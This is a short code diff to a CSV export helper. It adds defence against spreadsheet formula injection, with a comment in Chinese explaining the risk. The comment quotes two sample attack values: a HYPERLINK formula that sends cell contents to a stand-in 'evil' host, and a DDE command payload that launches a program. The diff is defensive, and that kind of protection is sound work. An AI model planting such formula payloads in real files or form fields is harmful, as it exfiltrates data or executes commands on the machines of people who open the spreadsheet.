@@ -20,6 +20,11 @@ const CSV_SCHEMA = {
   },
   escape(v){
     v = String(v == null ? "" : v);
+    /* 公式注入防護(CWE-1236):Excel/LibreOffice 會把以 = + - @(以及 tab、CR)開頭的儲存格
+       當公式求值。成員自填的姓名/公司/標語等欄位可經表單進來,若有人填
+       =HYPERLINK("https://evil/?x="&A1) 或 =cmd|'/c calc'!A1,匯出的 CSV 一被打開就外洩或執行。
+       前綴一個單引號讓試算表視為純文字。這一份同時被 build-roster.mjs 與後台匯出共用,改一處補兩路。 */
+    if(/^[=+\-@\t\r]/.test(v)) v = "'" + v;
     return /[",\n\r]/.test(v) ? '"' + v.replace(/"/g, '""') + '"' : v;
   },
 };
